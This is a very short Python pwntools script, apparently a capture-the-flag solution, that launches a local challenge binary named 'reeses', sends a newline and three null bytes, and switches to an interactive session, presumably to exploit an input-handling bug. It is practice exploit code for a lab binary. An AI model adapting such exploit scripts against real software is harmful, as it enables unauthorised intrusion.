#!/usr/bin/env python
from pwn import *

p = process('./reeses')
p.send('\n')
p.send('\x00')
p.send('\x00')
p.send('\x00')
p.interactive()
